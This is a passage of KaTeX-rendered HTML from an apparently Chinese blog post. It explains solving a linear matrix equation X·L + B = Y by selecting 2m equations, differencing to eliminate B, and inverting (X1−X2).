style=\"top:-1.3799999999999997em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span><span style=\"top:0.4799999999999998em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.679999999999999em;\"><span class=\"pstrut\" style=\"height:3.5em;\"></span><span class=\"mord\"><span class=\"minner\">⋯</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.8875em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.687499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5674999999999997em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mclose mtight\">)</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:0.2924999999999998em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.492499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mord mathnormal mtight\">m</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.950085000000001em;\"><span style=\"top:1.6500649999999992em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎠</span></span></span><span style=\"top:0.5000549999999994em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-0.09495500000000094em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-0.6899650000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-1.2849750000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-1.8799850000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-2.474995000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.0700050000000014em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-3.6650150000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-4.260025000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-4.855035000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-5.450045000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.0450550000000005em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.640065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-6.710065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎟</span></span></span><span style=\"top:-7.950085000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎞</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.450085em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h2 id=\"思路一\"><a class=\"anchor\" href=\"#思路一\">#</a> 思路一</h2>\n<p>这一方法基于常规的<mark>方阵</mark>矩阵方程解法，对于如下形式的矩阵方程：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>X</mi><mo>⋅</mo><mi>L</mi><mo>=</mo><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">X\\cdot L = Y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span></span></p>\n<p>最直接的解法就是对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 求逆：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><msup><mi>X</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>⋅</mo><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">L=X^{-1}\\cdot Y\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.864108em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span></span></p>\n<p>回到原来的问题，在 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>≥</mo><mn>2</mn><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">n\\geq 2m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.7719400000000001em;vertical-align:-0.13597em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord mathnormal\">m</span></span></span></span> 的背景下，对 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个方程暴力枚举的抽出 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">2m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord mathnormal\">m</span></span></span></span> 个方程，排列组成两个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span></span></span></span> 阶方阵的方程:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>X</mi><mn>1</mn><mo>⋅</mo><mi>L</mi><mo>+</mo><mi>B</mi><mo>=</mo><mi>Y</mi><mn>1</mn><mspace linebreak=\"newline\"></mspace><mi>X</mi><mn>2</mn><mo>⋅</mo><mi>L</mi><mo>+</mo><mi>B</mi><mo>=</mo><mi>Y</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">X1\\cdot L+B=Y1\\\\\nX2\\cdot L+B=Y2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">1</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">2</span></span></span></span></span></p>\n<p>做差消掉 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span></span></span></span>，得到齐次方程:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mo>⋅</mo><mi>L</mi><mo>=</mo><mi>Y</mi><mn>1</mn><mo>−</mo><mi>Y</mi><mn>2</mn></mrow><annotation encoding=\"application/x-tex\">(X1-X2)\\cdot L=Y1-Y2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">2</span></span></span></span></span></p>\n<p>然后检查些向量组成的矩阵 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(X1-X2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span></span></span> 是否可逆，若不可逆就继续枚举下一个，可逆就能算出答案:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>X</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>2</mn><msup><mo stretchy=\"false\">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>⋅</mo><mo stretchy=\"false\">(</mo><mi>Y</mi><mn>1</mn><mo>−</mo><mi>Y</mi><mn>2</mn><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace></mrow><annotation encoding=\"application/x-tex\">L=(X1-X2)^{-1}\\cdot(Y1-Y2)\\\\\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">2</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">2</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>B</mi><mo>=</mo><mi>Y</mi><mn>1</mn><mo>−</mo><mi>X</mi><mn>1</mn><mo>⋅</mo><mi>L</mi></mrow><annotation encoding=\"application/x-tex\">B = Y1-X1\\cdot L\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.76666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">L</span></span></span></span></span></p>\n<p>其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span></span></span></span> 是每一行均为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mover accent=\"true\"><mi>b</mi><mo>⃗</mo></mover></mrow><annotation encoding=\"application/x-tex\">\\vec b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.9774399999999999em;vertical-align:0em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9774399999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord mathnormal\">b</span></span><span style=\"top:-3.26344em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.2355em;\"><span class=\"overlay\" style=\"height:0.714em;width:0.471em;\"><svg width='0.471em' height='0.714em' style='width:0.471em' viewBox='0 0 471 714' preserveAspectRatio='xMinYMin'><path d='M377 20c0-5.333 1.833-10 5.5-14S391 0 397 0c4.667 0 8.667 1.667 12 5\n3.333 2.667 6.667 9 10 19 6.667 24.667 20.333 43.667 41 57 7.333 4.667 11\n10.667 11 18 0 6-1 10-3 12s-6.667 5-14 9c-28.667 14.667-53.667 35.667-75 63\n-1.333 1.333-3.167 3.5-5.5 6.5s-4 4.833-5 5.5c-1 .667-2.5 1.333-4.5 2s-4.333 1\n-7 1c-4.667 0-9.167-1.833-13.5-5.5S337 184 337 178c0-12.667 15.667-32.333 47-59\nH213l-171-1c-8.667-6-13-12.333-13-19 0-4.667 4.333-11.333 13-20h359\nc-16-25.333-24-45-24-59z'/></svg></span></span></span></span></span></span></span></span></span></span> 的方阵。</p>\n<p>在这个算法的基础上，从 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span> 个方程里面选 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2</mn><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">2m</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord mathnormal\">m</span></span></span></span> 个没什么问题，就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msubsup><mi>C</mi><mi>n</mi><mrow><mn>2</mn><mi>m</mi></mrow></msubsup></mrow><annotation encoding=\"application/x-tex\">C_{n}^{2m}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.061108em;vertical-align:-0.247em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span 